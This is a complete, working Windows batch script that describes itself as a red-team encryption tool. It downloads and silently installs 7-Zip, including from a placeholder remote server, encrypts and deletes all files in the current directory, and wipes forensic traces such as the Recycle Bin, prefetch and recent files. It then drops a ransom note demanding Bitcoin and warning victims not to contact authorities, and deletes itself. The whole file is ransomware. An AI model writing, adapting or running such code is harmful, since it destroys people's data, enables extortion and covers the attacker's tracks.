@echo off
REM ============================================================================
REM File Encryption Script (Windows Batch)
REM For AUTHORIZED Red Team Operations Only
REM WARNING: This will encrypt and delete files - use only in test environments
REM ============================================================================

setlocal enabledelayedexpansion

REM Enable debug mode: set DEBUG=1 before running script for verbose output
if "%DEBUG%"=="1" (
    echo [DEBUG] Debug mode enabled
    echo [DEBUG] Script started at %DATE% %TIME%
    @echo on
) else (
    set "DEBUG=0"
)

REM Configuration
set "REMOTE_SERVER=http://YOUR_SERVER_IP_HERE"
set "SEVEN_ZIP_URL=%REMOTE_SERVER%/7z.exe"
set "SEVEN_ZIP_INSTALLER=%REMOTE_SERVER%/7z-installer.exe"
set "ARCHIVE_NAME=encrypted_files.7z"
set "INSTALL_DIR=%ProgramFiles%\7-Zip"
set "SEVEN_ZIP_EXE=%INSTALL_DIR%\7z.exe"
set "TEMP_DIR=%TEMP%\7z_temp"

REM ============================================================================
REM Password Configuration - Multiple Methods (Priority Order)
REM ============================================================================
if "%DEBUG%"=="1" echo [DEBUG] Starting password configuration...

REM Method 1: Check for environment variable (highest priority - passed externally)
REM Usage: set ENCRYPT_KEY=yourpassword && encrypt_files.bat
if "%DEBUG%"=="1" echo [DEBUG] Checking for ENCRYPT_KEY environment variable...
if defined ENCRYPT_KEY (
    set "PASSWORD=%ENCRYPT_KEY%"
    set "PASSWORD_METHOD=Environment Variable"
    if "%DEBUG%"=="1" echo [DEBUG] Password set from environment variable
    goto :password_set
)
if "%DEBUG%"=="1" echo [DEBUG] ENCRYPT_KEY not found

REM Method 2: Decode from Base64-encoded string (obfuscated storage)
REM This is "antai" encoded in Base64: YW50YWk=
REM To encode your own: echo -n "yourpassword" | base64
if "%DEBUG%"=="1" echo [DEBUG] Attempting Base64 password decode...
set "ENCODED_PASSWORD=YW50YWk="
for /f "delims=" %%i in ('powershell -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%ENCODED_PASSWORD%'))" 2^>nul') do set "PASSWORD=%%i"
if defined PASSWORD (
    set "PASSWORD_METHOD=Base64 Decoded"
    if "%DEBUG%"=="1" echo [DEBUG] Password decoded from Base64
    goto :password_set
)
if "%DEBUG%"=="1" echo [DEBUG] Base64 decode failed

REM Method 3: Generate random password (use if above methods fail)
if "%DEBUG%"=="1" echo [DEBUG] Generating random password...
set "PASSWORD_METHOD=Random Generated"
for /f "delims=" %%i in ('powershell -Command "-join ((65..90) + (97..122) + (48..57) + (33,35,36,37,38,42,43,45,61) | Get-Random -Count 16 | ForEach-Object {[char]$_})" 2^>nul') do set "PASSWORD=%%i"

:password_set
REM Fallback if all methods fail
if not defined PASSWORD (
    if "%DEBUG%"=="1" echo [DEBUG] All password methods failed, using fallback
    set "PASSWORD=Fallback_P@ssw0rd_%RANDOM%%RANDOM%"
    set "PASSWORD_METHOD=Fallback Random"
)
if "%DEBUG%"=="1" echo [DEBUG] Password configured using: %PASSWORD_METHOD%

echo ============================================================================
echo File Encryption - Red Team Operation
echo ============================================================================
echo.
echo [WARNING] This script will encrypt and delete files in current directory
echo [WARNING] For authorized testing only - ensure proper authorization
echo.
echo Current Directory: %CD%
echo Archive Name: %ARCHIVE_NAME%
echo Password Method: %PASSWORD_METHOD%
echo.
timeout /t 5 /nobreak
echo.

REM ============================================================================
REM Step 1: Exhaustive 7-Zip Acquisition Strategy
REM ============================================================================
echo [*] Step 1/5: Locating or acquiring 7-Zip executable...
set "SEVEN_ZIP_FOUND=0"

if "%DEBUG%"=="1" (
    echo [DEBUG] Script directory: %~dp0
    echo [DEBUG] Current directory: %CD%
    echo [DEBUG] TEMP directory: %TEMP%
    echo [DEBUG] Remote server: %REMOTE_SERVER%
)

REM ============================================================================
REM Phase 1: Check for existing 7z.exe AND VERIFY IT WORKS
REM ============================================================================
echo [*] Phase 1: Checking for existing 7z.exe...

REM Priority 1.1: Script directory
if "%DEBUG%"=="1" echo [DEBUG] Checking: %~dp07z.exe
if exist "%~dp07z.exe" (
    if "%DEBUG%"=="1" echo [DEBUG] File exists, testing...
    call "%~dp07z.exe" >nul 2>&1
    if !ERRORLEVEL! LEQ 1 (
        echo [+] Found working 7z.exe in script directory
        set "SEVEN_ZIP_EXE=%~dp07z.exe"
        set "SEVEN_ZIP_FOUND=1"
        goto :encrypt
    ) else (
        echo [!] Found 7z.exe but it's not working (exit code: !ERRORLEVEL!)
    )
)

REM Priority 1.2: Current directory
if "%DEBUG%"=="1" echo [DEBUG] Checking: %CD%\7z.exe
if exist "%CD%\7z.exe" (
    if "%DEBUG%"=="1" echo [DEBUG] File exists, testing...
    call "%CD%\7z.exe" >nul 2>&1
    if !ERRORLEVEL! LEQ 1 (
        echo [+] Found working 7z.exe in current directory
        set "SEVEN_ZIP_EXE=%CD%\7z.exe"
        set "SEVEN_ZIP_FOUND=1"
        goto :encrypt
    ) else (
        echo [!] Found 7z.exe but it's not working (exit code: !ERRORLEVEL!)
    )
)

REM Priority 1.3: Program Files
if "%DEBUG%"=="1" echo [DEBUG] Checking: %ProgramFiles%\7-Zip\7z.exe
if exist "%ProgramFiles%\7-Zip\7z.exe" (
    if "%DEBUG%"=="1" echo [DEBUG] File exists, testing...
    call "%ProgramFiles%\7-Zip\7z.exe" >nul 2>&1
    if !ERRORLEVEL! LEQ 1 (
        echo [+] Found working 7-Zip in Program Files
        set "SEVEN_ZIP_EXE=%ProgramFiles%\7-Zip\7z.exe"
        set "SEVEN_ZIP_FOUND=1"
        goto :encrypt
    ) else (
        echo [!] Found 7z.exe but it's not working (exit code: !ERRORLEVEL!)
    )
)

REM Priority 1.4: Program Files (x86)
if "%DEBUG%"=="1" echo [DEBUG] Checking: %ProgramFiles(x86)%\7-Zip\7z.exe
if exist "%ProgramFiles(x86)%\7-Zip\7z.exe" (
    if "%DEBUG%"=="1" echo [DEBUG] File exists, testing...
    call "%ProgramFiles(x86)%\7-Zip\7z.exe" >nul 2>&1
    if !ERRORLEVEL! LEQ 1 (
        echo [+] Found working 7-Zip in Program Files (x86)
        set "SEVEN_ZIP_EXE=%ProgramFiles(x86)%\7-Zip\7z.exe"
        set "SEVEN_ZIP_FOUND=1"
        goto :encrypt
    ) else (
        echo [!] Found 7z.exe but it's not working (exit code: !ERRORLEVEL!)
    )
)

REM Priority 1.5: System PATH
if "%DEBUG%"=="1" echo [DEBUG] Checking system PATH for 7z.exe
where 7z.exe >nul 2>&1
if %ERRORLEVEL% EQU 0 (
    if "%DEBUG%"=="1" echo [DEBUG] Found in PATH, testing...
    call 7z.exe >nul 2>&1
    if !ERRORLEVEL! LEQ 1 (
        echo [+] Found working 7z.exe in system PATH
        set "SEVEN_ZIP_EXE=7z.exe"
        set "SEVEN_ZIP_FOUND=1"
        goto :encrypt
    ) else (
        echo [!] Found 7z.exe in PATH but it's not working
    )
)

echo [!] No working 7z.exe found in existing locations

REM ============================================================================
REM Phase 2: Check for previously downloaded installers
REM ============================================================================
echo [*] Phase 2: Checking for downloaded installer files...

REM Create or verify temp directory
if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%" 2>nul
if not exist "%TEMP_DIR%" (
    echo [!] Cannot create temp directory, using script directory
    set "TEMP_DIR=%~dp0"
)
if "%DEBUG%"=="1" echo [DEBUG] Using temp directory: %TEMP_DIR%

REM Check script directory for installers
if "%DEBUG%"=="1" echo [DEBUG] Checking for 7z2501-x64.msi in script directory
if exist "%~dp07z2501-x64.msi" (
    echo [+] Found MSI installer in script directory
    call :install_msi "%~dp07z2501-x64.msi"
    REM install_msi will jump to :encrypt if successful
)

if "%DEBUG%"=="1" echo [DEBUG] Checking for 7z2501-x64.exe in script directory
if exist "%~dp07z2501-x64.exe" (
    echo [+] Found EXE installer in script directory
    call :install_exe "%~dp07z2501-x64.exe"
    REM install_exe will jump to :encrypt if successful
)

if "%DEBUG%"=="1" echo [DEBUG] Checking for 7z2501-arm64.exe in script directory
if exist "%~dp07z2501-arm64.exe" (
    echo [+] Found ARM64 EXE installer in script directory
    call :install_exe "%~dp07z2501-arm64.exe"
    REM install_exe will jump to :encrypt if successful
)

REM ============================================================================
REM Phase 3: Download and install from official sources
REM ============================================================================
echo [*] Phase 3: Downloading 7-Zip from official sources...

REM Define download sources (official 7-zip.org)
set "URL_MSI_X64=https://www.7-zip.org/a/7z2501-x64.msi"
set "URL_EXE_X64=https://www.7-zip.org/a/7z2501-x64.exe"
set "URL_EXE_ARM64=https://www.7-zip.org/a/7z2501-arm64.exe"

REM Try MSI installer first (best for silent install)
echo [*] Attempting MSI download (x64)...
call :download_file "%URL_MSI_X64%" "%TEMP_DIR%\7z2501-x64.msi"
if !DOWNLOAD_SUCCESS! EQU 1 (
    call :install_msi "%TEMP_DIR%\7z2501-x64.msi"
    REM install_msi will jump to :encrypt if successful
)

REM Try x64 EXE installer
echo [*] Attempting EXE download (x64)...
call :download_file "%URL_EXE_X64%" "%TEMP_DIR%\7z2501-x64.exe"
if !DOWNLOAD_SUCCESS! EQU 1 (
    call :install_exe "%TEMP_DIR%\7z2501-x64.exe"
    REM install_exe will jump to :encrypt if successful
)

REM Try ARM64 EXE installer
echo [*] Attempting EXE download (ARM64)...
call :download_file "%URL_EXE_ARM64%" "%TEMP_DIR%\7z2501-arm64.exe"
if !DOWNLOAD_SUCCESS! EQU 1 (
    call :install_exe "%TEMP_DIR%\7z2501-arm64.exe"
    REM install_exe will jump to :encrypt if successful
)

REM ============================================================================
REM Phase 4: Try custom server downloads
REM ============================================================================
if not "%REMOTE_SERVER%"=="http://YOUR_SERVER_IP_HERE" (
    echo [*] Phase 4: Trying custom server downloads...

    REM Try custom server for standalone 7z.exe
    echo [*] Downloading from custom server: %SEVEN_ZIP_URL%
    call :download_file "%SEVEN_ZIP_URL%" "%TEMP_DIR%\7z.exe"
    if !DOWNLOAD_SUCCESS! EQU 1 (
        if exist "%TEMP_DIR%\7z.exe" (
            if "%DEBUG%"=="1" echo [DEBUG] Testing downloaded 7z.exe...
            call "%TEMP_DIR%\7z.exe" >nul 2>&1
            if !ERRORLEVEL! LEQ 1 (
                echo [+] Downloaded working 7z.exe from custom server
                set "SEVEN_ZIP_EXE=%TEMP_DIR%\7z.exe"
                set "SEVEN_ZIP_FOUND=1"
                goto :encrypt
            ) else (
                echo [!] Downloaded 7z.exe but it's not working
            )
        )
    )

    REM Try custom server for installer
    echo [*] Downloading installer from custom server: %SEVEN_ZIP_INSTALLER%
    call :download_file "%SEVEN_ZIP_INSTALLER%" "%TEMP_DIR%\7z-custom-installer.exe"
    if !DOWNLOAD_SUCCESS! EQU 1 (
        call :install_exe "%TEMP_DIR%\7z-custom-installer.exe"
        REM install_exe will jump to :encrypt if successful
    )
)

REM ============================================================================
REM All methods exhausted - final error
REM ============================================================================
echo.
echo [-] CRITICAL ERROR: Could not locate or obtain 7-Zip
echo [-] Attempted all available methods:
echo [-]   Phase 1: Checked existing installations
echo [-]   Phase 2: Checked for local installer files
echo [-]   Phase 3: Downloaded from 7-zip.org (MSI, EXE x64, EXE ARM64)
if not "%REMOTE_SERVER%"=="http://YOUR_SERVER_IP_HERE" (
    echo [-]   Phase 4: Tried custom server downloads
)
echo.
echo [-] Solutions:
echo [-]   1. Download 7z.exe and place in: %~dp0
echo [-]   2. Download 7z2501-x64.msi and place in: %~dp0
echo [-]   3. Install 7-Zip system-wide
echo [-]   4. Check internet connectivity
echo [-]   5. Run with DEBUG=1 for more details
echo.
if "%DEBUG%"=="1" (
    echo [DEBUG] Download attempts summary:
    echo [DEBUG]   All PowerShell, certutil, and bitsadmin methods tried
    echo [DEBUG]   All install methods attempted (MSI and EXE)
)
pause
exit /b 1

REM ============================================================================
REM Helper Functions
REM ============================================================================

:download_file
REM Downloads a file using multiple methods
REM %1 = URL
REM %2 = Destination path
set "DOWNLOAD_SUCCESS=0"
set "DL_URL=%~1"
set "DL_DEST=%~2"

if "%DEBUG%"=="1" (
    echo [DEBUG] download_file called
    echo [DEBUG]   URL: %DL_URL%
    echo [DEBUG]   Destination: %DL_DEST%
)

REM Method 1: PowerShell WebClient
if "%DEBUG%"=="1" echo [DEBUG] Trying PowerShell WebClient...
powershell -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wc = New-Object Net.WebClient; $wc.DownloadFile('%DL_URL%', '%DL_DEST%'); exit 0 } catch { exit 1 }" 2>nul
if %ERRORLEVEL% EQU 0 if exist "%DL_DEST%" (
    for %%A in ("%DL_DEST%") do set "FILESIZE=%%~zA"
    if !FILESIZE! GTR 1000 (
        echo [+] Downloaded successfully using PowerShell (!FILESIZE! bytes)
        set "DOWNLOAD_SUCCESS=1"
        goto :eof
    )
)

REM Method 2: Certutil
if "%DEBUG%"=="1" echo [DEBUG] Trying certutil...
certutil -urlcache -split -f "%DL_URL%" "%DL_DEST%" >nul 2>&1
if %ERRORLEVEL% EQU 0 if exist "%DL_DEST%" (
    for %%A in ("%DL_DEST%") do set "FILESIZE=%%~zA"
    if !FILESIZE! GTR 1000 (
        echo [+] Downloaded successfully using certutil (!FILESIZE! bytes)
        set "DOWNLOAD_SUCCESS=1"
        goto :eof
    )
)

REM Method 3: PowerShell Invoke-WebRequest
if "%DEBUG%"=="1" echo [DEBUG] Trying PowerShell Invoke-WebRequest...
powershell -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%DL_URL%' -OutFile '%DL_DEST%' -UseBasicParsing; exit 0 } catch { exit 1 }" 2>nul
if %ERRORLEVEL% EQU 0 if exist "%DL_DEST%" (
    for %%A in ("%DL_DEST%") do set "FILESIZE=%%~zA"
    if !FILESIZE! GTR 1000 (
        echo [+] Downloaded successfully using Invoke-WebRequest (!FILESIZE! bytes)
        set "DOWNLOAD_SUCCESS=1"
        goto :eof
    )
)

REM Method 4: Bitsadmin
if "%DEBUG%"=="1" echo [DEBUG] Trying bitsadmin...
bitsadmin /transfer "7zDownload" /priority high "%DL_URL%" "%DL_DEST%" >nul 2>&1
if %ERRORLEVEL% EQU 0 if exist "%DL_DEST%" (
    for %%A in ("%DL_DEST%") do set "FILESIZE=%%~zA"
    if !FILESIZE! GTR 1000 (
        echo [+] Downloaded successfully using bitsadmin (!FILESIZE! bytes)
        set "DOWNLOAD_SUCCESS=1"
        goto :eof
    )
)

echo [!] Download failed: %DL_URL%
if "%DEBUG%"=="1" echo [DEBUG] All download methods failed for this URL
goto :eof

:install_msi
REM Installs 7-Zip from MSI installer AND VERIFIES IT WORKS
REM %1 = Path to MSI file
set "MSI_PATH=%~1"
echo [*] Installing from MSI: %MSI_PATH%

if not exist "%MSI_PATH%" (
    echo [!] MSI file not found: %MSI_PATH%
    goto :eof
)

if "%DEBUG%"=="1" echo [DEBUG] Running msiexec /i "%MSI_PATH%" /qn /norestart INSTALLDIR="%ProgramFiles%\7-Zip"

REM Silent install with msiexec - use start /wait to ensure it completes
echo [*] Installing 7-Zip (this may take a moment)...
start /wait "" msiexec.exe /i "%MSI_PATH%" /qn /norestart INSTALLDIR="%ProgramFiles%\7-Zip" >nul 2>&1
echo [*] Waiting for installation to settle...
timeout /t 5 /nobreak >nul

REM Check and TEST common installation locations
if exist "%ProgramFiles%\7-Zip\7z.exe" (
    if "%DEBUG%"=="1" echo [DEBUG] Found at Program Files, testing...
    call "%ProgramFiles%\7-Zip\7z.exe" >nul 2>&1
    if !ERRORLEVEL! LEQ 1 (
        echo [+] MSI installation successful - 7z.exe is working
        set "SEVEN_ZIP_EXE=%ProgramFiles%\7-Zip\7z.exe"
        set "SEVEN_ZIP_FOUND=1"
        goto :encrypt
    ) else (
        echo [!] 7z.exe installed but not working (exit code: !ERRORLEVEL!)
    )
)

if exist "%ProgramFiles(x86)%\7-Zip\7z.exe" (
    if "%DEBUG%"=="1" echo [DEBUG] Found at Program Files (x86), testing...
    call "%ProgramFiles(x86)%\7-Zip\7z.exe" >nul 2>&1
    if !ERRORLEVEL! LEQ 1 (
        echo [+] MSI installation successful (x86) - 7z.exe is working
        set "SEVEN_ZIP_EXE=%ProgramFiles(x86)%\7-Zip\7z.exe"
        set "SEVEN_ZIP_FOUND=1"
        goto :encrypt
    ) else (
        echo [!] 7z.exe installed but not working (exit code: !ERRORLEVEL!)
    )
)

echo [!] MSI installation failed - 7z.exe not found or not working
if "%DEBUG%"=="1" (
    echo [DEBUG] Checked: %ProgramFiles%\7-Zip\7z.exe
    echo [DEBUG] Checked: %ProgramFiles(x86)%\7-Zip\7z.exe
)
goto :eof

:install_exe
REM Installs 7-Zip from EXE installer AND VERIFIES IT WORKS
REM %1 = Path to EXE file
set "EXE_PATH=%~1"
echo [*] Installing from EXE: %EXE_PATH%

if not exist "%EXE_PATH%" (
    echo [!] EXE file not found: %EXE_PATH%
    goto :eof
)

if "%DEBUG%"=="1" echo [DEBUG] Running "%EXE_PATH%" /S

REM Silent install with /S parameter
start /wait "" "%EXE_PATH%" /S
echo [*] Waiting for installation to complete...
timeout /t 10 /nobreak >nul

REM Check and TEST common installation locations
if exist "%ProgramFiles%\7-Zip\7z.exe" (
    if "%DEBUG%"=="1" echo [DEBUG] Found at Program Files, testing...
    call "%ProgramFiles%\7-Zip\7z.exe" >nul 2>&1
    if !ERRORLEVEL! LEQ 1 (
        echo [+] EXE installation successful - 7z.exe is working
        set "SEVEN_ZIP_EXE=%ProgramFiles%\7-Zip\7z.exe"
        set "SEVEN_ZIP_FOUND=1"
        goto :encrypt
    ) else (
        echo [!] 7z.exe installed but not working (exit code: !ERRORLEVEL!)
    )
)

if exist "%ProgramFiles(x86)%\7-Zip\7z.exe" (
    if "%DEBUG%"=="1" echo [DEBUG] Found at Program Files (x86), testing...
    call "%ProgramFiles(x86)%\7-Zip\7z.exe" >nul 2>&1
    if !ERRORLEVEL! LEQ 1 (
        echo [+] EXE installation successful (x86) - 7z.exe is working
        set "SEVEN_ZIP_EXE=%ProgramFiles(x86)%\7-Zip\7z.exe"
        set "SEVEN_ZIP_FOUND=1"
        goto :encrypt
    ) else (
        echo [!] 7z.exe installed but not working (exit code: !ERRORLEVEL!)
    )
)

echo [!] EXE installation failed - 7z.exe not found or not working
if "%DEBUG%"=="1" (
    echo [DEBUG] Checked: %ProgramFiles%\7-Zip\7z.exe
    echo [DEBUG] Checked: %ProgramFiles(x86)%\7-Zip\7z.exe
)
goto :eof

:encrypt
REM Step 3: Create encrypted archive
echo.
echo [*] Step 3/5: Creating encrypted 7z archive...
echo [*] Password: %PASSWORD%
echo [*] This may take a while depending on file size...
echo.

if "%DEBUG%"=="1" (
    echo [DEBUG] 7-Zip executable: "%SEVEN_ZIP_EXE%"
    echo [DEBUG] Archive path: "%CD%\%ARCHIVE_NAME%"
    echo [DEBUG] Source directory: "%CD%"
    echo [DEBUG] Password method: %PASSWORD_METHOD%
    echo [DEBUG] Testing 7-Zip executable...
    call "%SEVEN_ZIP_EXE%"
    echo [DEBUG] 7-Zip test exit code: %ERRORLEVEL%
    echo.
    echo [DEBUG] Checking disk space...
    for /f "tokens=3" %%a in ('dir /-c "%CD%" ^| findstr /C:"bytes free"') do set "FREE_SPACE=%%a"
    echo [DEBUG] Free space: !FREE_SPACE! bytes
    echo.
    echo [DEBUG] Current directory contents:
    dir /b "%CD%"
    echo.
)

REM Create archive with maximum compression and encryption
REM Parameters: -t7z (archive type), -m0=lzma2 (compression method), -mx=9 (ultra compression)
REM            -mfb=64 (fast bytes), -md=32m (32MB dictionary), -ms=on (solid), -mhe=on (encrypt headers)
REM NO EXCLUSIONS - simpler and avoids wildcard syntax issues. Scripts are small anyway.
if "%DEBUG%"=="1" (
    echo [DEBUG] Running 7-Zip with full output...
    echo [DEBUG] Command: 7z a -t7z -m0=lzma2 -mx=9 -mfb=64 -md=32m -ms=on -mhe=on -p[PASSWORD] [ARCHIVE] [FILES]
    call "%SEVEN_ZIP_EXE%" a -t7z -m0=lzma2 -mx=9 -mfb=64 -md=32m -ms=on -mhe=on "-p%PASSWORD%" "%CD%\%ARCHIVE_NAME%" * -r
) else (
    call "%SEVEN_ZIP_EXE%" a -t7z -m0=lzma2 -mx=9 -mfb=64 -md=32m -ms=on -mhe=on "-p%PASSWORD%" "%CD%\%ARCHIVE_NAME%" * -r 2>nul
)

set "ARCHIVE_RESULT=%ERRORLEVEL%"
if "%DEBUG%"=="1" echo ^[DEBUG^] 7-Zip archive creation exit code: %ARCHIVE_RESULT%

REM 7-Zip exit codes: 0=success, 1=warning(non-fatal), 2=fatal error, 7=command line error, 8=not enough memory, 255=user stopped
REM SUCCESS is 0 or 1, anything else is FAILURE
if %ARCHIVE_RESULT% GTR 1 (
    echo.
    echo ^[-^] Failed to create archive - Error Level: %ARCHIVE_RESULT%
    echo ^[!^] Possible causes:
    if %ARCHIVE_RESULT% EQU 2 echo ^[!^]   - Error code 2: Fatal error ^(no files matched or permission denied^)
    if %ARCHIVE_RESULT% EQU 7 echo ^[!^]   - Error code 7: Command line error
    if %ARCHIVE_RESULT% EQU 8 echo ^[!^]   - Error code 8: Not enough memory
    echo.
    if "%DEBUG%"=="1" (
        echo ^[DEBUG^] Attempting to run 7-Zip help to verify it works...
        call "%SEVEN_ZIP_EXE%" --help
        echo ^[DEBUG^] 7-Zip help exit code: !ERRORLEVEL!
    )
    echo ^[-^] Operation aborted - no files will be deleted
    pause
    exit /b 1
)

REM Exit code 0 or 1 is acceptable (1 = warnings but success)
echo.
echo ^[+^] Archive creation successful ^(exit code: %ARCHIVE_RESULT%^)
if %ARCHIVE_RESULT% EQU 1 (
    echo ^[!^] Warning: Archive created with warnings ^(non-fatal^)
)

if "%DEBUG%"=="1" echo ^[DEBUG^] Checking if archive file was created...
if not exist "%ARCHIVE_NAME%" (
    echo ^[-^] Archive file was not created
    echo ^[-^] Expected location: %CD%\%ARCHIVE_NAME%
    if "%DEBUG%"=="1" (
        echo ^[DEBUG^] Directory listing after archive attempt:
        dir /b "%CD%"
    )
    echo ^[-^] Operation aborted - no files will be deleted
    pause
    exit /b 1
)

for %%A in ("%CD%\%ARCHIVE_NAME%") do set "ARCHIVE_SIZE=%%~zA"
if "%DEBUG%"=="1" echo [DEBUG] Archive file size: %ARCHIVE_SIZE% bytes

echo [+] Archive created successfully: %ARCHIVE_NAME%

REM Step 4: Verify archive was created
echo.
echo [*] Step 4/5: Verifying archive integrity...
if not exist "%CD%\%ARCHIVE_NAME%" (
    echo [-] CRITICAL: Archive file not found!
    echo [-] Expected location: %CD%\%ARCHIVE_NAME%
    echo [-] Aborting deletion phase for safety
    pause
    exit /b 1
)

REM Check archive size (should be > 0 bytes)
for %%A in ("%CD%\%ARCHIVE_NAME%") do set "ARCHIVE_SIZE=%%~zA"
if "%ARCHIVE_SIZE%"=="0" (
    echo [-] CRITICAL: Archive file is 0 bytes!
    echo [-] Aborting deletion phase for safety
    pause
    exit /b 1
)

echo [*] Archive size: %ARCHIVE_SIZE% bytes
echo [*] Testing archive integrity with password...

if "%DEBUG%"=="1" echo [DEBUG] Running: "%SEVEN_ZIP_EXE%" t -p[PASSWORD] "%CD%\%ARCHIVE_NAME%"
call "%SEVEN_ZIP_EXE%" t -p%PASSWORD% "%CD%\%ARCHIVE_NAME%" >nul 2>&1
set "VERIFY_ARCHIVE_RESULT=%ERRORLEVEL%"
if "%DEBUG%"=="1" echo [DEBUG] Archive test exit code: %VERIFY_ARCHIVE_RESULT%

if %VERIFY_ARCHIVE_RESULT% GTR 0 (
    echo [-] CRITICAL: Archive verification failed!
    echo [-] Exit code: %VERIFY_ARCHIVE_RESULT%
    echo [-] The archive may be corrupted or password incorrect
    echo [-] Aborting deletion phase for safety
    echo.
    echo [*] Attempting to get more details...
    call "%SEVEN_ZIP_EXE%" t -p%PASSWORD% "%CD%\%ARCHIVE_NAME%"
    pause
    exit /b 1
)

echo [+] Archive verified successfully - integrity confirmed

REM Step 5: Delete original files
echo.
echo [*] Step 5/5: Deleting original files...
echo [WARNING] This will permanently delete files!
echo [WARNING] Press Ctrl+C to abort in the next 5 seconds...
timeout /t 5 /nobreak
echo.

REM Count files before deletion
set "FILE_COUNT=0"
set "DELETED_COUNT=0"
set "FAILED_COUNT=0"

echo [*] Scanning for files to delete...

REM Delete all files except the archive, scripts, and 7z files
for /f "delims=" %%F in ('dir /b /a-d /s 2^>nul') do (
    set "DELETE_FILE=1"

    REM Skip the archive itself
    echo %%F | findstr /i /c:"%ARCHIVE_NAME%" >nul && set "DELETE_FILE=0"

    REM Skip 7z files
    echo %%F | findstr /i /c:".7z" >nul && set "DELETE_FILE=0"

    REM Skip this script
    echo %%F | findstr /i /c:"%~nx0" >nul && set "DELETE_FILE=0"

    REM Skip README_IMPORTANT.txt
    echo %%F | findstr /i /c:"README_IMPORTANT.txt" >nul && set "DELETE_FILE=0"

    if "!DELETE_FILE!"=="1" (
        set /a FILE_COUNT+=1
        echo [*] Deleting: %%F
        del /f /q "%%F" 2>nul
        if not exist "%%F" (
            set /a DELETED_COUNT+=1
        ) else (
            set /a FAILED_COUNT+=1
            echo [!] Warning: Failed to delete %%F
        )
    )
)

echo.
echo [*] Deletion Summary:
echo [*]   Files processed: %FILE_COUNT%
echo [*]   Successfully deleted: %DELETED_COUNT%
if %FAILED_COUNT% GTR 0 (
    echo [!]   Failed to delete: %FAILED_COUNT%
) else (
    echo [*]   Failed to delete: %FAILED_COUNT%
)

REM Delete empty directories (non-critical, suppress errors)
echo [*] Removing empty directories...
for /f "delims=" %%D in ('dir /b /ad /s 2^>nul ^| sort /r') do (
    rd "%%D" 2>nul
)

echo [+] File deletion completed

REM Cleanup temp directory
if exist "%TEMP_DIR%" rd /s /q "%TEMP_DIR%" 2>nul

REM Step 6: System cleanup and recycle bin emptying
echo.
echo [*] Step 6/6: Running system cleanup...
echo [*] Starting background cleanup processes...

REM Empty Recycle Bin (all drives)
echo [*] Emptying Recycle Bin...
powershell -Command "$Shell = New-Object -ComObject Shell.Application; $RecycleBin = $Shell.Namespace(0xA); $RecycleBin.Items() | ForEach-Object { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue }" 2>nul
if %ERRORLEVEL% EQU 0 (
    echo [+] Recycle Bin emptied successfully
) else (
    REM Fallback method using rd
    echo [*] Using alternate method to empty Recycle Bin...
    rd /s /q %SystemDrive%\$Recycle.Bin 2>nul
)

REM Clear Windows temp files in background
echo [*] Starting temp file cleanup in background...
start /B cmd /c "del /f /s /q %TEMP%\* 2>nul & del /f /s /q %SystemRoot%\Temp\* 2>nul"

REM Run Disk Cleanup in background (silent mode)
echo [*] Starting Windows Disk Cleanup in background...
start /B cleanmgr /sagerun:1 2>nul

REM Clear prefetch files (if admin)
echo [*] Clearing prefetch files...
del /f /q %SystemRoot%\Prefetch\*.pf 2>nul
if %ERRORLEVEL% EQU 0 (
    echo [+] Prefetch files cleared
) else (
    echo [!] Could not clear prefetch (may require admin privileges)
)

REM Clear recent documents
echo [*] Clearing recent documents...
del /f /q "%APPDATA%\Microsoft\Windows\Recent\*.*" 2>nul
if %ERRORLEVEL% EQU 0 (
    echo [+] Recent documents cleared
)

REM Clear thumbnail cache
echo [*] Clearing thumbnail cache...
del /f /s /q "%LOCALAPPDATA%\Microsoft\Windows\Explorer\thumbcache_*.db" 2>nul

echo [+] System cleanup initiated (running in background)

REM Final summary
echo.
echo ============================================================================
echo Operation Complete
echo ============================================================================
echo [+] Encrypted archive: %CD%\%ARCHIVE_NAME%
echo [+] Password: %PASSWORD%
echo [+] Original files have been deleted
echo [+] System cleanup processes started
echo.
echo [*] To extract files, use:
echo     7z x %ARCHIVE_NAME% -p%PASSWORD%
echo ============================================================================
echo.

REM Create a ransom note
echo ============================================================================ > README_IMPORTANT.txt
echo YOUR FILES HAVE BEEN ENCRYPTED >> README_IMPORTANT.txt
echo ============================================================================ >> README_IMPORTANT.txt
echo. >> README_IMPORTANT.txt
echo All your files have been encrypted with military-grade encryption. >> README_IMPORTANT.txt
echo To decrypt your files, you must pay the ransom. >> README_IMPORTANT.txt
echo. >> README_IMPORTANT.txt
echo Contact: darkweb@onion.com >> README_IMPORTANT.txt
echo Bitcoin Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa >> README_IMPORTANT.txt
echo. >> README_IMPORTANT.txt
echo After payment, you will receive the decryption key. >> README_IMPORTANT.txt
echo DO NOT attempt to decrypt files yourself or contact authorities. >> README_IMPORTANT.txt
echo This will result in permanent data loss. >> README_IMPORTANT.txt
echo. >> README_IMPORTANT.txt
echo You have 48 hours to comply. >> README_IMPORTANT.txt
echo ============================================================================ >> README_IMPORTANT.txt

echo ^[+^] Ransom note created: README_IMPORTANT.txt
echo.

REM Self-delete the script - using inline command (no temp files)
echo ^[*^] Removing script traces...
if "%DEBUG%"=="1" echo ^[DEBUG^] Script path: %~f0

REM Store current directory and script path
set "SCRIPT_PATH=%~f0"
set "SCRIPT_DIR=%~dp0"

REM Use inline CMD command to delete after script exits
start /min cmd /c "timeout /t 2 /nobreak >nul & del /f /q "%SCRIPT_PATH%" 2>nul & cd /d "%SCRIPT_DIR%" & del /f /q encrypt_files.* 2>nul & del /f /q 7z*.* 2>nul & rd /s /q %SYSTEMDRIVE%\$Recycle.Bin 2>nul"

if "%DEBUG%"=="1" echo ^[DEBUG^] Self-delete command launched

REM Exit immediately
exit /b 0
